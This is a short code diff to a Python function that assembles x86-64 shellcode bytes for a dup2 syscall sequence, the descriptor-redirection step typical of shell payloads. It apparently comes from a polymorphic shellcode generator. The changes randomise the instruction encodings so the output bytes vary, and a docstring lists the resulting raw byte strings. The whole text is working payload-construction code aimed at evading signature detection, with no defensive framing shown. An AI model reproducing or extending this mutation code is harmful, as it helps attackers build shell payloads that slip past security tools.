@@ -4,7 +4,7 @@ from func_instu import *
 
 def partie3():
 
-    x = random.randint(0, 0)
+    x = random.randint(0, 1)
 
     if x == 0:
         resultat = movxl('al', 33)
@@ -17,7 +17,7 @@ def partie3():
 
     pushr8 = '\\x41\\x50' # push r8
     poprdi = '\\x5f' # pop rdi
-    xorrsi = '\\x48\\x31\\xf6' # xor rsi, rsi
+    xorrsi = randomxor('rsi') # xor rsi, rsi
     syscall = '\\x0f\\x05' # syscall
 
     resultat_concat = resultat + pushr8 + poprdi + xorrsi + syscall
@@ -33,4 +33,5 @@ def partie3():
     \xb0\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
     \x30\xc0\x04\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
     """
+
     return resultat_concat
